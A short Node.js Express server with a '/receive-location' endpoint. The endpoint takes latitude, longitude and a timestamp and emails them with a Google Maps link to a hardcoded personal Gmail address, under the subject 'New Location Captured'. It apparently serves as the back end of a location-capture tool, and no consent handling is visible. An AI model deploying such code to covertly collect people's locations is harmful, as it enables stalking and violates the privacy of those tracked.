const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

app.post('/receive-location', async (req, res) => {
    const { latitude, longitude, timestamp } = req.body;
    const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;

    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: 'shivendra.04gaharwar@gmail.com',
        subject: 'New Location Captured',
        text: `Latitude: ${latitude}\nLongitude: ${longitude}\nTime: ${timestamp}\nGoogle Maps: ${mapsLink}`
    };

    try {
        await transporter.sendMail(mailOptions);
        res.status(200).send('Email sent');
    } catch (error) {
        console.error('Error sending email:', error);
        res.status(500).send('Error sending email');
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
